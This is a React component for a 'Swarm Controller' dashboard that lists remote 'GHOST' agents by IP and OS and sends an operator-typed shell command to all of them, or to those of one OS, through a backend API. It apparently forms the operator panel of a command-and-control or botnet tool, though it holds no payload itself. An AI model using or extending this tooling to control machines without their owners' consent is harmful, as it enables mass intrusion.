import { useState, useEffect } from 'react';
import { Users, Play, ShieldAlert, Cpu, HardDrive, Terminal, Layers } from 'lucide-react';

interface SwarmStats {
  total: number;
  windows: number;
  linux: number;
  macos: number;
  active: number;
}

interface SwarmControllerProps {
  onMonitor?: (id: string) => void;
}

const SwarmController = ({ onMonitor }: SwarmControllerProps) => {
  const [stats, setStats] = useState<SwarmStats | null>(null);
  const [agents, setAgents] = useState<any[]>([]);
  const [filter, setFilter] = useState<string>('all');
  const [command, setCommand] = useState<string>('whoami');
  const [executing, setExecuting] = useState(false);

  const fetchData = async () => {
    try {
      const sRes = await fetch("/api/swarm/stats");
      if (sRes.ok) setStats(await sRes.json());
      
      const aRes = await fetch("/api/agents");
      if (aRes.ok) setAgents(await aRes.json());
    } catch (e) {}
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleSwarmExecute = async () => {
    setExecuting(true);
    try {
      const res = await fetch("/api/swarm/execute", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command: { type: "shell", cmd: command },
          filters: filter === 'all' ? {} : { os: filter }
        })
      });
      if (res.ok) {
        const result = await res.json();
        console.log(`Swarm targeted ${result.targeted_agents} agents.`);
      }
    } catch (e) {
      console.error("Swarm execution failed", e);
    } finally {
      setTimeout(() => setExecuting(false), 2000);
    }
  };

  return (
    <div className="flex flex-col h-full bg-black/40 text-red-500/80 font-mono text-[10px]">
      <div className="p-3 border-b border-red-500/30 flex items-center justify-between bg-red-500/5">
        <div className="flex items-center gap-2">
          <Layers size={14} className="text-red-500" />
          <span className="font-bold uppercase tracking-widest">The Swarm Controller</span>
        </div>
        <div className="flex items-center gap-2">
           <span className="flex h-1.5 w-1.5 rounded-full bg-red-500 animate-pulse" />
           <span className="text-[8px] opacity-70">SYST: COORD</span>
        </div>
      </div>

      <div className="p-4 space-y-4">
        {/* Stats Grid */}
        <div className="grid grid-cols-2 gap-2">
          <div className="p-2 border border-zinc-800 bg-black/20 flex items-center gap-2">
             <Users size={12} className="text-zinc-500" />
             <div className="flex flex-col">
               <span className="text-[8px] text-zinc-600 uppercase">Total Swarm</span>
               <span className="text-red-400 font-bold">{stats?.total || 0}</span>
             </div>
          </div>
          <div className="p-2 border border-zinc-800 bg-black/20 flex items-center gap-2">
             <Cpu size={12} className="text-zinc-500" />
             <div className="flex flex-col">
               <span className="text-[8px] text-zinc-600 uppercase">Active Core</span>
               <span className="text-green-400 font-bold">{stats?.active || 0}</span>
             </div>
          </div>
        </div>

        {/* Filters */}
        <div className="space-y-2">
          <div className="flex justify-between items-center text-[8px] text-zinc-500 uppercase font-bold px-1">
            <span>Filter Targeting</span>
            <span className="text-red-500/50">Selective Dispatch</span>
          </div>
          <div className="flex gap-2">
            {['all', 'windows', 'linux'].map(f => (
              <button
                key={f}
                onClick={() => setFilter(f)}
                className={`flex-1 py-1 border uppercase text-[8px] font-bold transition-all ${
                  filter === f ? 'bg-red-500/20 border-red-500 text-red-400' : 'bg-black/40 border-zinc-800 text-zinc-600 hover:border-zinc-700'
                }`}
              >
                {f}
              </button>
            ))}
          </div>
        </div>

        {/* Command Input */}
        <div className="space-y-2">
          <div className="flex items-center gap-2 text-[8px] text-zinc-500 uppercase font-bold px-1">
            <Terminal size={10} />
            <span>Swarm Command</span>
          </div>
          <input 
            type="text"
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            className="w-full bg-black/60 border border-zinc-800 p-2 text-zinc-300 outline-none focus:border-red-500/50 transition-all"
            placeholder="ENTER SWARM CMD..."
          />
        </div>

        {/* Execute Button */}
        <button 
          onClick={handleSwarmExecute}
          disabled={executing}
          className={`w-full group relative overflow-hidden flex items-center justify-center gap-3 py-3 border border-red-500/40 bg-red-500/10 transition-all hover:bg-red-500 hover:text-white ${executing ? 'animate-pulse opacity-50' : ''}`}
        >
          <div className="absolute inset-0 bg-red-500 scale-x-0 group-hover:scale-x-100 transition-transform origin-left duration-500 -z-10" />
          <Play size={14} className={executing ? 'animate-spin' : ''} />
          <span className="font-black uppercase tracking-[0.2em]">Execute Swarm</span>
          <ShieldAlert size={14} />
        </button>

        {/* Active Units List */}
        <div className="space-y-2">
           <div className="flex items-center justify-between text-[8px] text-zinc-500 uppercase font-bold px-1 border-t border-zinc-900 pt-3">
              <span>Active Units</span>
              <span>{agents.length} Online</span>
           </div>
           <div className="max-h-40 overflow-y-auto space-y-1 custom-scrollbar pr-1">
             {agents.map(a => (
               <div key={a.id} className="flex items-center justify-between p-2 bg-red-500/5 border border-red-500/10 rounded group">
                  <div className="flex flex-col">
                    <span className="text-[9px] font-bold text-red-500">GHOST_{a.id.slice(0,8)}</span>
                    <span className="text-[7px] text-zinc-500">{a.ip} | {a.os}</span>
                  </div>
                  <button 
                    onClick={() => onMonitor?.(a.id)}
                    className="p-1 px-2 border border-red-500/20 rounded hover:bg-red-500 hover:text-white transition-all text-[7px] font-bold uppercase"
                  >
                    Monitor
                  </button>
               </div>
             ))}
           </div>
        </div>

        <div className="flex justify-between items-center pt-2 text-[7px] text-zinc-700 uppercase">
           <span>Protocol: SWARM_V1</span>
           <span>Auth: ADMIN_OVERRIDE</span>
        </div>
      </div>
    </div>
  );
};

export default SwarmController;
